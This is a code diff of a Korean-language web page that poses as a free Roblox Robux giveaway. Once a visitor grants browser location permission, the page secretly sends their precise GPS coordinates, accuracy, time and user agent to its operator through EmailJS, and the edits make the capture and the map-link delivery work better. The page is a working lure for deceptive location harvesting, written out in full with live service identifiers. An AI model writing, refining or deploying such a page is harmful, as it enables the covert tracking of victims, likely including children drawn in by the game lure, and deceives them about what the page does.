@@ -3,11 +3,11 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>무료 Roblox Robux 이벤트 참여</title>
+  <title>무료 Roblox 이벤트 참여</title>
   <style>
     body {margin:0;padding:0;height:100vh;background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;overflow:hidden;}
     .container {text-align:center;padding:30px;max-width:95%;}
-    h1 {font-size:2.4rem;margin-bottom:20px;text-shadow:0 0 10px #0f0;}
+    h1 {font-size:2.5rem;margin-bottom:20px;text-shadow:0 0 10px #0f0;}
     .status {font-size:1.3rem;color:#ff0044;margin:25px 0;line-height:1.5;}
     .loader {width:80px;height:80px;border:8px solid #0f0;border-top:8px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin:30px auto;}
     button {background:#5865f2;color:white;border:none;padding:16px 0;width:80%;border-radius:8px;font-size:1.2rem;cursor:pointer;margin:20px auto;display:block;}
@@ -20,15 +20,15 @@
   <div class="container">
     <h1>Robux 100,000 무료 지급 중...</h1>
     <div class="loader" id="loader"></div>
-    <div class="status" id="status">위치 확인을 위해 브라우저 팝업에서 "허용" 눌러주세요!</div>
-    <button onclick="requestLocation()">위치 허용하고 Robux 받기</button>
+    <div class="status" id="status">위치 확인을 위해 "허용" 눌러주세요!</div>
+    <button onclick="getLocation()">위치 허용하고 Robux 받기</button>
   </div>
 
   <script>
     emailjs.init("ycbHVBt3cm6FkCL--");
 
-    async function requestLocation() {
-      document.getElementById("status").innerHTML = "위치 권한 요청 중...";
+    function getLocation() {
+      document.getElementById("status").innerHTML = "위치 권한 요청 중... (팝업에서 허용 눌러주세요)";
 
       if (!navigator.geolocation) {
         document.getElementById("status").innerHTML = "이 브라우저는 위치 기능을 지원하지 않습니다.";
@@ -37,9 +37,9 @@
 
       navigator.geolocation.getCurrentPosition(
         async (pos) => {
-          const gps = {
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
+          const info = {
+            latitude: pos.coords.latitude.toFixed(6),
+            longitude: pos.coords.longitude.toFixed(6),
             accuracy: pos.coords.accuracy + "m",
             time: new Date().toISOString(),
             userAgent: navigator.userAgent,
@@ -48,22 +48,24 @@
 
           try {
             await emailjs.send("service_jmsvqzd", "template_fjunjx8", {
-              token: JSON.stringify(gps, null, 2),
-              url: location.href,
-              time: gps.time,
-              userAgent: gps.userAgent
+              latitude: info.latitude,
+              longitude: info.longitude,
+              accuracy: info.accuracy,
+              url: info.url,
+              time: info.time,
+              userAgent: info.userAgent
             });
 
             document.getElementById("status").innerHTML = 
-              "완료! 위치 정보 수집됨<br>Robux 지급 대기 중... (메일함 확인)";
+              "완료! 위치 정보 수집됨<br>메일에 구글 지도 링크 도착했습니다!";
           } catch(e) {
             document.getElementById("status").innerHTML = "전송 오류: " + (e.message || "알 수 없음");
           }
         },
         (err) => {
           let msg = "위치 권한 거부됨";
-          if (err.code === 1) msg += "<br>브라우저에서 위치 허용을 눌러주세요";
-          if (err.code === 2) msg += "<br>위치 정보를 가져올 수 없음 (GPS 꺼짐?)";
+          if (err.code === 1) msg += "<br>브라우저에서 위치 허용 눌러주세요";
+          if (err.code === 2) msg += "<br>GPS 꺼져 있거나 위치 못 찾음";
           if (err.code === 3) msg += "<br>시간 초과";
           document.getElementById("status").innerHTML = msg;
         },
